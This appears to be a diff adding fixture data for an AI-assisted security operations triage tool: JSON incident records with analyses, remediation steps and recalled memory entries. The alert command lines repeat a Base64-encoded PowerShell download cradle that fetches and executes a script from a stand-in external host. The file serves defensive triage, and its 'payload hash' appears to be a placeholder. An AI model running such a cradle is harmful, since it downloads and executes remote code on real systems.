@@ -1,0 +1,425 @@
+[
+  {
+    "id": "INC-2026-0891",
+    "alert": {
+      "alertId": "SEC-4401",
+      "title": "Suspicious PowerShell execution on FIN-SRV-04",
+      "severity": "critical",
+      "timestamp": "2026-11-06T19:14:22.000Z",
+      "sourceIp": "10.0.12.44",
+      "destinationIp": "198.51.100.24",
+      "affectedAsset": "FIN-SRV-04",
+      "userAccount": "CORP\\svc-payroll",
+      "processName": "powershell.exe",
+      "commandLine": "powershell.exe -ExecutionPolicy Bypass -NoProfile -WindowStyle Hidden -EncodedCommand SUVYIChOZXctT2JqZWN0IE5ldC5XZWJDbGllbnQpLkRvd25sb2FkU3RyaW5nKCdodHRwOi8vMTk4LjUxLjEwMC4yNDo4MDgwL3NjcmlwdHMvc2NyLnBzMScp",
+      "parentProcess": "wmic.exe",
+      "fileHash": "e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855",
+      "detectionSource": "CrowdStrike Falcon Sensor / Sysmon Event ID 1",
+      "rawLogs": "{\"event_id\": 1, \"image\": \"C:\\\\Windows\\\\System32\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe\", \"parent_image\": \"C:\\\\Windows\\\\System32\\\\wbem\\\\WMIC.exe\", \"user\": \"CORP\\\\svc-payroll\", \"integrity_level\": \"High\"}",
+      "tags": [
+        "T1059.001",
+        "T1047",
+        "Finance-Subnet",
+        "C2-Beacon"
+      ]
+    },
+    "status": "confirmed_malicious",
+    "createdAt": "2026-11-06T19:15:00.000Z",
+    "updatedAt": "2026-11-06T19:42:00.000Z",
+    "investigation": {
+      "incidentId": "SEC-4401",
+      "analyzedAt": "2026-11-06T19:16:30.000Z",
+      "threatVerdict": "Confirmed Malicious PowerShell C2 Ingestion via WMIC",
+      "severity": "critical",
+      "confidence": 98,
+      "summary": "Adversary leveraged compromised service account svc-payroll to remotely invoke encoded PowerShell via WMI on FIN-SRV-04, attempting to retrieve scr.ps1 from an external staging host.",
+      "suspiciousActivityExplanation": [
+        "WMIC.exe invoked on FIN-SRV-04 under high-integrity service credentials without scheduled task justification.",
+        "Obfuscated Base64 PowerShell flags (-NoProfile -WindowStyle Hidden) utilized to bypass basic command logging.",
+        "Direct HTTP request initiated to untrusted external IP (198.51.100.24:8080) targeting secondary payload scr.ps1."
+      ],
+      "mitreTechniques": [
+        {
+          "id": "T1059.001",
+          "tactic": "Execution",
+          "name": "Command and Scripting Interpreter: PowerShell"
+        },
+        {
+          "id": "T1047",
+          "tactic": "Execution",
+          "name": "Windows Management Instrumentation (WMI)"
+        },
+        {
+          "id": "T1027",
+          "tactic": "Defense Evasion",
+          "name": "Obfuscated Files or Information"
+        },
+        {
+          "id": "T1071.001",
+          "tactic": "Command and Control",
+          "name": "Application Layer Protocol: Web Protocols"
+        }
+      ],
+      "evidence": [
+        "Process: C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+        "Parent Process: C:\\Windows\\System32\\wbem\\WMIC.exe",
+        "Command Line contains encoded download cradle: http://198.51.100.24:8080/scripts/scr.ps1",
+        "Authenticated Account: CORP\\svc-payroll"
+      ],
+      "assumptions": [
+        "External IP 198.51.100.24 is an active attacker-controlled C2 redirector.",
+        "Initial access gained via phishing or password spraying targeting accounting tier."
+      ],
+      "recommendedSteps": [
+        {
+          "priority": "immediate",
+          "action": "Isolate FIN-SRV-04 from the corporate network.",
+          "rationale": "Halt potential lateral movement into financial ledger databases."
+        },
+        {
+          "priority": "immediate",
+          "action": "Revoke and rotate Kerberos TGT and NTLM hashes for CORP\\svc-payroll.",
+          "rationale": "Invalidate hijacked authentication tokens across Active Directory."
+        },
+        {
+          "priority": "high",
+          "action": "Blacklist external IP 198.51.100.24 on perimeter firewalls.",
+          "rationale": "Sever outbound C2 communication channel."
+        },
+        {
+          "priority": "high",
+          "action": "Perform memory acquisition on FIN-SRV-04 before reboot.",
+          "rationale": "Capture volatile payload and injected DLL artifacts."
+        }
+      ],
+      "memoryInformed": false,
+      "recalledMemoriesCount": 0,
+      "memoryInfluenceSummary": "Baseline investigation created prior to memory retention."
+    },
+    "feedback": {
+      "verdict": "confirmed_malicious",
+      "analystName": "Alex Mercer (Lead Threat Hunter)",
+      "notes": "Incident validated. Forensic analysis verified memory injection attempt targeting LSASS process. Forensic triage recovered secondary script scr.ps1 containing Cobalt Strike stager.",
+      "rootCause": "Compromised service account svc-payroll utilized WMIC process creation to execute obfuscated PowerShell staging script for credential dumping.",
+      "remediationTaken": "1. Isolated FIN-SRV-04 via EDR. 2. Reset svc-payroll password and revoked all active Kerberos TGT tickets. 3. Blocked external C2 IP 198.51.100.24 on perimeter firewalls. 4. Updated EDR blocklist for payload hash e3b0c442...",
+      "retainedInHindsight": true,
+      "hindsightResponse": {
+        "success": true,
+        "bankId": "sentinelops-soc-prod",
+        "operationId": "hs-op-89104-fin-04",
+        "message": "Successfully retained incident outcome in Hindsight Cloud memory bank"
+      },
+      "submittedAt": "2026-11-06T19:42:00.000Z"
+    }
+  },
+  {
+    "id": "INC-2026-0895",
+    "alert": {
+      "alertId": "SEC-4402",
+      "title": "Suspicious PowerShell execution on FIN-SRV-07",
+      "severity": "critical",
+      "timestamp": "2026-11-06T22:15:10.000Z",
+      "sourceIp": "10.0.12.78",
+      "destinationIp": "198.51.100.24",
+      "affectedAsset": "FIN-SRV-07",
+      "userAccount": "CORP\\svc-payroll",
+      "processName": "powershell.exe",
+      "commandLine": "powershell.exe -ExecutionPolicy Bypass -NoProfile -WindowStyle Hidden -EncodedCommand SUVYIChOZXctT2JqZWN0IE5ldC5XZWJDbGllbnQpLkRvd25sb2FkU3RyaW5nKCdodHRwOi8vMTk4LjUxLjEwMC4yNDo4MDgwL3NjcmlwdHMvc2NyLnBzMScp",
+      "parentProcess": "wmic.exe",
+      "fileHash": "e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855",
+      "detectionSource": "CrowdStrike Falcon Sensor / Sysmon Event ID 1",
+      "rawLogs": "{\"event_id\": 1, \"image\": \"C:\\\\Windows\\\\System32\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe\", \"parent_image\": \"C:\\\\Windows\\\\System32\\\\wbem\\\\WMIC.exe\", \"user\": \"CORP\\\\svc-payroll\", \"integrity_level\": \"High\"}",
+      "tags": [
+        "T1059.001",
+        "T1047",
+        "Finance-Subnet",
+        "Unresolved-Alert"
+      ]
+    },
+    "status": "confirmed_malicious",
+    "createdAt": "2026-11-06T22:15:30.000Z",
+    "updatedAt": "2026-11-07T08:34:46.226Z",
+    "investigation": {
+      "incidentId": "SEC-4402",
+      "analyzedAt": "2026-11-07T08:34:26.209Z",
+      "threatVerdict": "High-Risk Obfuscated PowerShell Execution",
+      "severity": "critical",
+      "confidence": 96,
+      "summary": "Alert on FIN-SRV-07 strongly mirrors historical incident on FIN-SRV-04. Attacker leverages encoded script execution and WMIC execution for lateral positioning.",
+      "suspiciousActivityExplanation": [
+        "Process powershell.exe spawned with non-standard command arguments.",
+        "Obfuscated command line flags detected: powershell.exe -ExecutionPolicy Bypass -NoProfile -WindowStyle Hidden -EncodedCommand SUVYIChOZXctT2...",
+        "Parent process is wmic.exe, which is commonly abused for remote process execution.",
+        "Organizational memory confirmed identical staging pattern previously mitigated on FIN-SRV-04."
+      ],
+      "mitreTechniques": [
+        {
+          "id": "T1059.001",
+          "tactic": "Execution",
+          "name": "Command and Scripting Interpreter: PowerShell",
+          "description": "Adversaries may abuse PowerShell commands and scripts for execution."
+        },
+        {
+          "id": "T1047",
+          "tactic": "Execution",
+          "name": "Windows Management Instrumentation (WMI)",
+          "description": "Adversaries may abuse WMI to execute malicious commands and move laterally."
+        },
+        {
+          "id": "T1027",
+          "tactic": "Defense Evasion",
+          "name": "Obfuscated Files or Information",
+          "description": "Adversaries may attempt to make an executable or script difficult to discover or analyze."
+        }
+      ],
+      "evidence": [
+        "Observed process: powershell.exe (Parent: wmic.exe)",
+        "Host asset: FIN-SRV-07 (Source IP: 10.0.12.78)",
+        "Raw Command line: \"powershell.exe -ExecutionPolicy Bypass -NoProfile -WindowStyle Hidden -EncodedCommand SUVYIChOZXctT2JqZWN0IE5ldC5XZWJDbGllbnQpLkRvd25sb2FkU3RyaW5nKCdodHRwOi8vMTk4LjUxLjEwMC4yNDo4MDgwL3NjcmlwdHMvc2NyLnBzMScp\"",
+        "Authenticated Account: CORP\\svc-payroll"
+      ],
+      "assumptions": [
+        "Command payload may be downloading an in-memory C2 agent or beacon.",
+        "Possible compromise of service account credentials based on parent execution tree.",
+        "Attacker may possess persistence mechanisms on adjacent subnets."
+      ],
+      "recommendedSteps": [
+        {
+          "priority": "immediate",
+          "action": "Isolate FIN-SRV-07 from enterprise network via EDR endpoint containment.",
+          "rationale": "Prevent command-and-control beaconing and internal subnet reconnaissance."
+        },
+        {
+          "priority": "immediate",
+          "action": "Revoke and rotate Kerberos/NTLM tokens for associated service accounts.",
+          "rationale": "Memory from FIN-SRV-04 revealed svc-payroll credentials were leaked during the earlier attack."
+        },
+        {
+          "priority": "high",
+          "action": "Extract and decode Base64 command payload from memory dump.",
+          "rationale": "Identify secondary C2 staging URLs and payload hashes for enterprise-wide IOC sweep."
+        },
+        {
+          "priority": "medium",
+          "action": "Review Windows Event ID 4688 and PowerShell Script Block Logging (ID 4104).",
+          "rationale": "Verify whether child processes were spawned prior to isolation."
+        }
+      ],
+      "memoryInformed": true,
+      "recalledMemoriesCount": 9,
+      "memoryInfluenceSummary": "Applied learnings from previous incident on Unknown Asset (Historical SOC Incident). Historical resolution confirmed credential harvesting attempt via obfuscated PowerShell; playbook recommendations prioritized host isolation and svc-payroll credential revocation."
+    },
+    "recalledMemories": [
+      {
+        "id": "a3975a92-2ba6-4221-8bc0-183071559886",
+        "title": "Historical SOC Incident",
+        "summary": "{\"id\":\"a3975a92-2ba6-4221-8bc0-183071559886\",\"text\":\"The service account svc-payroll used WMIC to execute an obfuscated PowerShell script for credential dumping.\",\"type\":\"observation\",\"entities\":[\"PowerShell\",\"svc-payroll\",\"INC-2026-0891\",\"FIN-SRV-04\"],\"context\":null,\"occurred_start\":\"2026-11-07T00:00:00+00:00\",\"occurred_end\":\"2026-11-07T23:59:59+00:00\",\"mentioned_at\":\"2026-11-07T08:32:43.392000+00:00\",\"document_id\":null,\"metadata\":null,\"chunk_id\":null,\"tags\":[],\"source_fact_ids\":null,\"scores\":{\"final\":1,\"reranker\":null,\"semantic\":0.6847278475761414,\"keyword\":3.5367770195007324},\"attachments\":null}",
+        "asset": "Unknown Asset",
+        "resolution": "Retained from previous analyst playbook",
+        "verdict": "confirmed_malicious",
+        "relevanceScore": 0.88,
+        "source": "hindsight_cloud",
+        "timestamp": "2026-11-07T08:34:19.715Z"
+      },
+      {
+        "id": "f9ee3993-efa0-493d-9bbf-462677add633",
+        "title": "SOC Incident Resolution & Analyst Feedback",
+        "summary": "{\"id\":\"f9ee3993-efa0-493d-9bbf-462677add633\",\"text\":\"Incident INC-2026-0891 involved confirmed malicious PowerShell execution on asset FIN-SRV-04. | When: 2026-11-07 | Where: FIN-SRV-04 | Compromised service account svc-payroll used WMIC to execute an obfuscated PowerShell script for credential dumping.\",\"type\":\"world\",\"entities\":[\"PowerShell\",\"svc-payroll\",\"INC-2026-0891\",\"FIN-SRV-04\"],\"context\":\"SOC Incident Resolution & Analyst Feedback\",\"occurred_start\":\"2026-11-07T00:00:00+00:00\",\"occurred_end\":\"2026-11-07T23:59:59+00:00\",\"mentioned_at\":\"2026-11-07T08:32:43.392000+00:00\",\"document_id\":\"a7569d4b-d47b-4ae5-84f0-de368f7eb56b\",\"metadata\":{\"incidentId\":\"INC-2026-0891\",\"alertId\":\"SEC-4401\",\"affectedAsset\":\"FIN-SRV-04\",\"verdict\":\"confirmed_malicious\",\"severity\":\"critical\",\"processName\":\"powershell.exe\"},\"chunk_id\":\"MK_a7569d4b-d47b-4ae5-84f0-de368f7eb56b_0\",\"tags\":[],\"source_fact_ids\":null,\"scores\":{\"final\":0.8888888888888888,\"reranker\":null,\"semantic\":0.8090552091598511,\"keyword\":5.192415714263916},\"attachments\":null}",
+        "asset": "FIN-SRV-04",
+        "resolution": "Retained from previous analyst playbook",
+        "verdict": "confirmed_malicious",
+        "relevanceScore": 0.88,
+        "source": "hindsight_cloud",
+        "timestamp": "2026-11-07T08:34:19.715Z"
+      },
+      {
+        "id": "17bd8b6c-ce77-4fd0-b7b3-d8aaa7ee3b54",
+        "title": "Historical SOC Incident",
+        "summary": "{\"id\":\"17bd8b6c-ce77-4fd0-b7b3-d8aaa7ee3b54\",\"text\":\"Incident INC-2026-0891 involved confirmed malicious PowerShell execution on asset FIN-SRV-04.\",\"type\":\"observation\",\"entities\":[\"PowerShell\",\"svc-payroll\",\"INC-2026-0891\",\"FIN-SRV-04\"],\"context\":null,\"occurred_start\":\"2026-11-07T00:00:00+00:00\",\"occurred_end\":\"2026-11-07T23:59:59+00:00\",\"mentioned_at\":\"2026-11-07T08:32:43.392000+00:00\",\"document_id\":null,\"metadata\":null,\"chunk_id\":null,\"tags\":[],\"source_fact_ids\":null,\"scores\":{\"final\":0.7777777777777778,\"reranker\":null,\"semantic\":0.8085570335388184,\"keyword\":5.372260570526123},\"attachments\":null}",
+        "asset": "Unknown Asset",
+        "resolution": "Retained from previous analyst playbook",
+        "verdict": "confirmed_malicious",
+        "relevanceScore": 0.88,
+        "source": "hindsight_cloud",
+        "timestamp": "2026-11-07T08:34:19.715Z"
+      },
+      {
+        "id": "1a0ccf25-a224-4863-a003-4d3b1870e907",
+        "title": "SOC Incident Resolution & Analyst Feedback",
+        "summary": "{\"id\":\"1a0ccf25-a224-4863-a003-4d3b1870e907\",\"text\":\"Forensic analysis confirmed memory injection targeting the LSASS process and identified a Cobalt Strike stager in script scr.ps1. | When: 2026-11-07 | Where: FIN-SRV-04\",\"type\":\"world\",\"entities\":[\"scr.ps1\",\"Cobalt Strike\",\"LSASS\"],\"context\":\"SOC Incident Resolution & Analyst Feedback\",\"occurred_start\":\"2026-11-07T00:00:00.010000+00:00\",\"occurred_end\":\"2026-11-07T23:59:59.010000+00:00\",\"mentioned_at\":\"2026-11-07T08:32:43.402000+00:00\",\"document_id\":\"a7569d4b-d47b-4ae5-84f0-de368f7eb56b\",\"metadata\":{\"incidentId\":\"INC-2026-0891\",\"alertId\":\"SEC-4401\",\"affectedAsset\":\"FIN-SRV-04\",\"verdict\":\"confirmed_malicious\",\"severity\":\"critical\",\"processName\":\"powershell.exe\"},\"chunk_id\":\"MK_a7569d4b-d47b-4ae5-84f0-de368f7eb56b_0\",\"tags\":[],\"source_fact_ids\":null,\"scores\":{\"final\":0.6666666666666666,\"reranker\":null,\"semantic\":0.6308179497718811,\"keyword\":1.50241219997406},\"attachments\":null}",
+        "asset": "FIN-SRV-04",
+        "resolution": "Retained from previous analyst playbook",
+        "verdict": "confirmed_malicious",
+        "relevanceScore": 0.88,
+        "source": "hindsight_cloud",
+        "timestamp": "2026-11-07T08:34:19.715Z"
+      },
+      {
+        "id": "604c794e-ad9d-4d07-b9eb-64c67ea3a90b",
+        "title": "Historical SOC Incident",
+        "summary": "{\"id\":\"604c794e-ad9d-4d07-b9eb-64c67ea3a90b\",\"text\":\"A Cobalt Strike stager was identified in script scr.ps1.\",\"type\":\"observation\",\"entities\":[\"scr.ps1\",\"Cobalt Strike\",\"LSASS\"],\"context\":null,\"occurred_start\":\"2026-11-07T00:00:00.010000+00:00\",\"occurred_end\":\"2026-11-07T23:59:59.010000+00:00\",\"mentioned_at\":\"2026-11-07T08:32:43.402000+00:00\",\"document_id\":null,\"metadata\":null,\"chunk_id\":null,\"tags\":[],\"source_fact_ids\":null,\"scores\":{\"final\":0.5555555555555556,\"reranker\":null,\"semantic\":0.5516827702522278,\"keyword\":null},\"attachments\":null}",
+        "asset": "Unknown Asset",
+        "resolution": "Retained from previous analyst playbook",
+        "verdict": "confirmed_malicious",
+        "relevanceScore": 0.88,
+        "source": "hindsight_cloud",
+        "timestamp": "2026-11-07T08:34:19.715Z"
+      },
+      {
+        "id": "216ffc34-92c3-4227-b731-06f5d4e4c5c9",
+        "title": "Historical SOC Incident",
+        "summary": "{\"id\":\"216ffc34-92c3-4227-b731-06f5d4e4c5c9\",\"text\":\"Forensic analysis confirmed memory injection targeting the LSASS process.\",\"type\":\"observation\",\"entities\":[\"scr.ps1\",\"Cobalt Strike\",\"LSASS\"],\"context\":null,\"occurred_start\":\"2026-11-07T00:00:00.010000+00:00\",\"occurred_end\":\"2026-11-07T23:59:59.010000+00:00\",\"mentioned_at\":\"2026-11-07T08:32:43.402000+00:00\",\"document_id\":null,\"metadata\":null,\"chunk_id\":null,\"tags\":[],\"source_fact_ids\":null,\"scores\":{\"final\":0.4444444444444444,\"reranker\":null,\"semantic\":0.6042134761810303,\"keyword\":1.7595152854919434},\"attachments\":null}",
+        "asset": "Unknown Asset",
+        "resolution": "Retained from previous analyst playbook",
+        "verdict": "confirmed_malicious",
+        "relevanceScore": 0.88,
+        "source": "hindsight_cloud",
+        "timestamp": "2026-11-07T08:34:19.715Z"
+      },
+      {
+        "id": "48e4b4ed-bfec-4226-8d80-e9accfa524ec",
+        "title": "Historical SOC Incident",
+        "summary": "{\"id\":\"48e4b4ed-bfec-4226-8d80-e9accfa524ec\",\"text\":\"The compromised service account was svc-payroll.\",\"type\":\"observation\",\"entities\":[\"PowerShell\",\"svc-payroll\",\"INC-2026-0891\",\"FIN-SRV-04\"],\"context\":null,\"occurred_start\":\"2026-11-07T00:00:00+00:00\",\"occurred_end\":\"2026-11-07T23:59:59+00:00\",\"mentioned_at\":\"2026-11-07T08:32:43.392000+00:00\",\"document_id\":null,\"metadata\":null,\"chunk_id\":null,\"tags\":[],\"source_fact_ids\":null,\"scores\":{\"final\":0.3333333333333333,\"reranker\":null,\"semantic\":0.5203160643577576,\"keyword\":null},\"attachments\":null}",
+        "asset": "Unknown Asset",
+        "resolution": "Retained from previous analyst playbook",
+        "verdict": "confirmed_malicious",
+        "relevanceScore": 0.88,
+        "source": "hindsight_cloud",
+        "timestamp": "2026-11-07T08:34:19.715Z"
+      },
+      {
+        "id": "de76fc90-b9da-498d-b0dd-39657297b279",
+        "title": "SOC Incident Resolution & Analyst Feedback",
+        "summary": "{\"id\":\"de76fc90-b9da-498d-b0dd-39657297b279\",\"text\":\"Remediation actions included isolating FIN-SRV-04, resetting svc-payroll credentials, revoking Kerberos tickets, blocking C2 IP 198.51.100.24, and updating EDR blocklists. | When: 2026-11-07\",\"type\":\"world\",\"entities\":[\"198.51.100.24\",\"EDR\",\"svc-payroll\",\"FIN-SRV-04\"],\"context\":\"SOC Incident Resolution & Analyst Feedback\",\"occurred_start\":\"2026-11-07T00:00:00.020000+00:00\",\"occurred_end\":\"2026-11-07T23:59:59.020000+00:00\",\"mentioned_at\":\"2026-11-07T08:32:43.412000+00:00\",\"document_id\":\"a7569d4b-d47b-4ae5-84f0-de368f7eb56b\",\"metadata\":{\"incidentId\":\"INC-2026-0891\",\"alertId\":\"SEC-4401\",\"affectedAsset\":\"FIN-SRV-04\",\"verdict\":\"confirmed_malicious\",\"severity\":\"critical\",\"processName\":\"powershell.exe\"},\"chunk_id\":\"MK_a7569d4b-d47b-4ae5-84f0-de368f7eb56b_0\",\"tags\":[],\"source_fact_ids\":null,\"scores\":{\"final\":0.2222222222222222,\"reranker\":null,\"semantic\":0.6297439932823181,\"keyword\":0.49460482597351074},\"attachments\":null}",
+        "asset": "FIN-SRV-04",
+        "resolution": "Retained from previous analyst playbook",
+        "verdict": "confirmed_malicious",
+        "relevanceScore": 0.88,
+        "source": "hindsight_cloud",
+        "timestamp": "2026-11-07T08:34:19.715Z"
+      },
+      {
+        "id": "2cec461e-8fa8-4cc4-921c-622bb477f61a",
+        "title": "Historical SOC Incident",
+        "summary": "{\"id\":\"2cec461e-8fa8-4cc4-921c-622bb477f61a\",\"text\":\"Remediation actions included isolating FIN-SRV-04, resetting svc-payroll credentials, revoking Kerberos tickets, blocking C2 IP 198.51.100.24, and updating EDR blocklists.\",\"type\":\"observation\",\"entities\":[\"198.51.100.24\",\"EDR\",\"svc-payroll\",\"FIN-SRV-04\"],\"context\":null,\"occurred_start\":\"2026-11-07T00:00:00.020000+00:00\",\"occurred_end\":\"2026-11-07T23:59:59.020000+00:00\",\"mentioned_at\":\"2026-11-07T08:32:43.412000+00:00\",\"document_id\":null,\"metadata\":null,\"chunk_id\":null,\"tags\":[],\"source_fact_ids\":null,\"scores\":{\"final\":0.1111111111111111,\"reranker\":null,\"semantic\":0.5160220861434937,\"keyword\":1.4254101514816284},\"attachments\":null}",
+        "asset": "Unknown Asset",
+        "resolution": "Retained from previous analyst playbook",
+        "verdict": "confirmed_malicious",
+        "relevanceScore": 0.88,
+        "source": "hindsight_cloud",
+        "timestamp": "2026-11-07T08:34:19.715Z"
+      }
+    ],
+    "feedback": {
+      "verdict": "confirmed_malicious",
+      "analystName": "Alex Mercer (Lead SOC Analyst)",
+      "notes": "Investigation completed. Confirmed malicious execution pattern matching institutional playbook.",
+      "rootCause": "Lateral movement from previously compromised accounting credentials (svc-payroll) invoking remote WMIC execution.",
+      "remediationTaken": "1. Host FIN-SRV-07 network isolated. 2. Invalidate active Kerberos tickets. 3. Re-verify perimeter block for 198.51.100.24.",
+      "retainedInHindsight": true,
+      "hindsightResponse": {
+        "success": true,
+        "bankId": "MK",
+        "message": "Retained in Hindsight Cloud"
+      },
+      "submittedAt": "2026-11-07T08:34:46.226Z"
+    }
+  },
+  {
+    "id": "INC-2026-0872",
+    "alert": {
+      "alertId": "SEC-4389",
+      "title": "Canary Ransomware Decoy File Modified on FILE-SRV-02",
+      "severity": "critical",
+      "timestamp": "2026-11-06T14:20:00.000Z",
+      "sourceIp": "10.0.4.12",
+      "affectedAsset": "FILE-SRV-02",
+      "userAccount": "SYSTEM",
+      "processName": "veeam_backup.exe",
+      "commandLine": "veeam_backup.exe --job-id=daily-corp-sync --mode=dedup",
+      "detectionSource": "Sentinel Canary Guard",
+      "rawLogs": "{\"canary_file\": \"D:\\\\Shares\\\\Finance\\\\!Readme_Encrypted.txt\", \"trigger\": \"file_entropy_check\"}",
+      "tags": [
+        "Ransomware-Canary",
+        "FileServer"
+      ]
+    },
+    "status": "false_positive",
+    "createdAt": "2026-11-06T14:21:00.000Z",
+    "updatedAt": "2026-11-06T15:02:00.000Z",
+    "investigation": {
+      "incidentId": "SEC-4389",
+      "analyzedAt": "2026-11-06T14:25:00.000Z",
+      "threatVerdict": "Automated Canary Triggered by Enterprise Backup Job",
+      "severity": "medium",
+      "confidence": 94,
+      "summary": "High entropy modification detected on canary decoy directory caused by scheduled Veeam deduplication engine during maintenance window.",
+      "suspiciousActivityExplanation": [
+        "File modification signature coincided with scheduled storage deduplication window at 14:20.",
+        "Executing process verified as legitimately signed Veeam binary."
+      ],
+      "mitreTechniques": [
+        {
+          "id": "T1486",
+          "tactic": "Impact",
+          "name": "Data Encrypted for Impact"
+        }
+      ],
+      "evidence": [
+        "Process binary: C:\\Program Files\\Veeam\\Backup\\veeam_backup.exe (Valid Microsoft Authenticode signature)",
+        "Trigger file was read, compressed and rewritten during backup"
+      ],
+      "assumptions": [
+        "Canary folder was not excluded from Veeam job scope."
+      ],
+      "recommendedSteps": [
+        {
+          "priority": "medium",
+          "action": "Whitelist canary honeypot directories from backup agent scanning.",
+          "rationale": "Prevent false alarms during scheduled storage maintenance."
+        }
+      ],
+      "memoryInformed": false,
+      "recalledMemoriesCount": 0
+    },
+    "feedback": {
+      "verdict": "false_positive",
+      "analystName": "Elena Rostova",
+      "notes": "Confirmed false positive. Storage maintenance job compressed canary decoy file. No ransomware behavior present.",
+      "rootCause": "Veeam deduplication and compression engine scanned honeypot folder.",
+      "remediationTaken": "Updated backup policy exclusion rules to skip Sentinel Canary directories.",
+      "retainedInHindsight": true,
+      "hindsightResponse": {
+        "success": true,
+        "bankId": "sentinelops-soc-prod",
+        "operationId": "hs-op-87201-file-02",
+        "message": "Retained false positive pattern in Hindsight memory"
+      },
+      "submittedAt": "2026-11-06T15:02:00.000Z"
+    }
+  },
+  {
+    "id": "INC-2026-0880",
+    "alert": {
+      "alertId": "SEC-4395",
+      "title": "Suspicious Anomaly: DNS Tunneling Query Volume Spike",
+      "severity": "medium",
+      "timestamp": "2026-11-06T17:45:00.000Z",
+      "sourceIp": "10.0.18.99",
+      "destinationIp": "8.8.8.8",
+      "affectedAsset": "DEV-WRK-19",
+      "userAccount": "CORP\\m.chen",
+      "processName": "chrome.exe",
+      "detectionSource": "CoreDNS Zeek Sensor",
+      "rawLogs": "{\"query_count\": 4820, \"subdomain_entropy\": 4.82, \"root_domain\": \"telemetry-metrics.io\"}",
+      "tags": [
+        "T1071.004",
+        "DNS-Exfiltration",
+        "Workstation"
+      ]
+    },
+    "status": "investigating",
+    "createdAt": "2026-11-06T17:46:00.000Z",
+    "updatedAt": "2026-11-06T17:46:00.000Z"
+  }
+]
